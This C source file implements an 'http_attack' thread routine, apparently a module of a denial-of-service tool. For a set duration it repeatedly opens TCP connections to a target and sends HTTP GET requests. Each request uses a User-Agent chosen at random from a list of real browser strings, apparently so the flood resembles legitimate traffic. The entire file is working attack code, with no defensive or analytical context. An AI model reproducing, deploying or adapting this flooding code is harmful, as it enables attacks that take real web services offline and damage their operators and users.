#include <stdio.h>
#include <string.h>
#include <time.h>
#include "headers/http_attack.h"

void* http_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;
    int sock = -1;
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = params->target_addr.sin_port;
    target_addr.sin_addr = params->target_addr.sin_addr;

    const char* user_agents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/16.17017",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
    };

    srand(time(NULL));
    time_t end_time = time(NULL) + params->duration;

    while (params->active && time(NULL) < end_time) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) == 0) {
            char buffer[1024] = {0};
            const char* user_agent = user_agents[rand() % (sizeof(user_agents) / sizeof(user_agents[0]))];
            snprintf(buffer, sizeof(buffer), "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n\r\n",
                     inet_ntoa(params->target_addr.sin_addr), user_agent);
            send(sock, buffer, strlen(buffer), 0);
        }
        close(sock);
    }
    return NULL;
}
